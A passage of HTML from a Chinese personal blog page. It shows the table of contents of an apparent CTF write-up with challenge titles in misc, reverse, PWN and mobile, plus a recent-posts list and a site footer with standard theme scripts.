class="toc-link" href="#%E8%8F%9C%E9%B8%9F%E9%BB%91%E5%AE%A2-1"><span class="toc-number">2.3.</span> <span class="toc-text">菜鸟黑客-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8F%9C%E9%B8%9F%E9%BB%91%E5%AE%A2-2"><span class="toc-number">2.4.</span> <span class="toc-text">菜鸟黑客-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%A4%E5%A7%86%E5%8E%86%E9%99%A9%E8%AE%B0"><span class="toc-number">2.5.</span> <span class="toc-text">汤姆历险记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E4%BC%A0%E9%80%92"><span class="toc-number">2.6.</span> <span class="toc-text">信息传递</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E7%9B%B8%E4%BF%A1AI%E5%90%97%EF%BC%9F"><span class="toc-number">2.7.</span> <span class="toc-text">你相信AI吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mystery-of-bits"><span class="toc-number">2.8.</span> <span class="toc-text">mystery of bits</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">2.9.</span> <span class="toc-text">通信方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8A%9D%E5%A3%AB%E9%9B%AA%E8%B1%B9"><span class="toc-number">2.10.</span> <span class="toc-text">芝士雪豹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%A6%EF%BC%9F%E6%91%A9%E6%96%AF%E5%AF%86%E7%A0%81%EF%BC%9F"><span class="toc-number">2.11.</span> <span class="toc-text">哦？摩斯密码？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brain-Game"><span class="toc-number">2.12.</span> <span class="toc-text">Brain Game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-RSA"><span class="toc-number">2.13.</span> <span class="toc-text">Guess RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AC%E4%BD%A0%E5%BF%83%E8%B7%B3%E9%87%8C%E7%9A%84%E7%8B%82"><span class="toc-number">2.14.</span> <span class="toc-text">听你心跳里的狂</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#G9%E7%9A%84%E9%92%A2%E7%90%B4%E6%9B%B2"><span class="toc-number">2.15.</span> <span class="toc-text">G9的钢琴曲</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BNG"><span class="toc-number">2.16.</span> <span class="toc-text">BNG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-Where"><span class="toc-number">2.17.</span> <span class="toc-text">Guess!Where?</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-number">3.</span> <span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JustDoIt"><span class="toc-number">3.1.</span> <span class="toc-text">JustDoIt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E9%97%A8%E9%81%81%E7%94%B2"><span class="toc-number">3.2.</span> <span class="toc-text">奇门遁甲</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E5%BD%A2%E8%AE%B0"><span class="toc-number">3.3.</span> <span class="toc-text">变形记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Convert"><span class="toc-number">3.4.</span> <span class="toc-text">Convert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pull-the-Wool-Over-People%E2%80%99s-Eyes"><span class="toc-number">3.5.</span> <span class="toc-text">Pull the Wool Over People’s Eyes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%82%E9%A3%99-1"><span class="toc-number">3.6.</span> <span class="toc-text">狂飙-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CrackMePlease"><span class="toc-number">3.7.</span> <span class="toc-text">CrackMePlease</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Congratulations"><span class="toc-number">3.8.</span> <span class="toc-text">Congratulations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%82%E9%A3%99-2"><span class="toc-number">3.9.</span> <span class="toc-text">狂飙-2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">4.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B"><span class="toc-number">4.1.</span> <span class="toc-text">三个愿望</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Login"><span class="toc-number">4.2.</span> <span class="toc-text">Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double"><span class="toc-number">4.3.</span> <span class="toc-text">Double</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#chef"><span class="toc-number">4.4.</span> <span class="toc-text">chef</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%9C%E8%AF%AD%E4%BA%BA"><span class="toc-number">4.5.</span> <span class="toc-text">谜语人</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E8%AF%86%E5%8A%BF"><span class="toc-number">4.6.</span> <span class="toc-text">第二识势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%94%A8%E7%AC%94-1"><span class="toc-number">4.7.</span> <span class="toc-text">第一用笔-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Your-character"><span class="toc-number">4.8.</span> <span class="toc-text">Your_character</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%B0%E5%B1%80"><span class="toc-number">4.9.</span> <span class="toc-text">困局</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Eat-num"><span class="toc-number">4.10.</span> <span class="toc-text">Eat_num</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SIMS"><span class="toc-number">4.11.</span> <span class="toc-text">SIMS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezheap"><span class="toc-number">4.12.</span> <span class="toc-text">ezheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezuheap"><span class="toc-number">4.13.</span> <span class="toc-text">ezuheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap"><span class="toc-number">4.14.</span> <span class="toc-text">babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crazy-heap"><span class="toc-number">4.15.</span> <span class="toc-text">Crazy_heap</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mobile"><span class="toc-number">5.</span> <span class="toc-text">mobile</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NOJAVA"><span class="toc-number">5.1.</span> <span class="toc-text">NOJAVA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WhereisHint"><span class="toc-number">5.2.</span> <span class="toc-text">WhereisHint</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ManyJNI"><span class="toc-number">5.3.</span> <span class="toc-text">ManyJNI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ManyMany"><span class="toc-number">5.4.</span> <span class="toc-text">ManyMany</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MobileTest"><span class="toc-number">5.5.</span> <span class="toc-text">MobileTest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Whereisflag"><span class="toc-number">5.6.</span> <span class="toc-text">Whereisflag</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/11/27/MD5%E7%AE%97%E6%B3%95/" title="MD5算法"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MD5算法"/></a><div class="content"><a class="title" href="/2023/11/27/MD5%E7%AE%97%E6%B3%95/" title="MD5算法">MD5算法</a><time datetime="2023-11-27T13:20:03.100Z" title="发表于 2023-11-27 21:20:03">2023-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/24/tea%E7%B3%BB%E5%88%97%E7%AE%97%E6%B3%95/" title="tea系列算法"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="tea系列算法"/></a><div class="content"><a class="title" href="/2023/11/24/tea%E7%B3%BB%E5%88%97%E7%AE%97%E6%B3%95/" title="tea系列算法">tea系列算法</a><time datetime="2023-11-24T13:02:15.681Z" title="发表于 2023-11-24 21:02:15">2023-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/14/2023%E7%BA%BF%E4%B8%8AISCC%20%E9%83%A8%E5%88%86WP/" title="2023线上ISCC部分WP"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2023线上ISCC部分WP"/></a><div class="content"><a class="title" href="/2023/11/14/2023%E7%BA%BF%E4%B8%8AISCC%20%E9%83%A8%E5%88%86WP/" title="2023线上ISCC部分WP">2023线上ISCC部分WP</a><time datetime="2023-11-14T12:14:27.863Z" title="发表于 2023-11-14 20:14:27">2023-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/13/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse9/" title="刷题记录reverse9"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="刷题记录reverse9"/></a><div class="content"><a class="title" href="/2023/11/13/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse9/" title="刷题记录reverse9">刷题记录reverse9</a><time datetime="2023-11-13T12:14:00.641Z" title="发表于 2023-11-13 20:14:00">2023-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/07/%E8%AE%B0RE%E5%87%BA%E9%A2%98/" title="记RE出题"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记RE出题"/></a><div class="content"><a class="title" href="/2023/11/07/%E8%AE%B0RE%E5%87%BA%E9%A2%98/" title="记RE出题">记RE出题</a><time datetime="2023-11-07T11:41:13.045Z" title="发表于 2023-11-07 19:41:13">2023-11-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By dwb</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>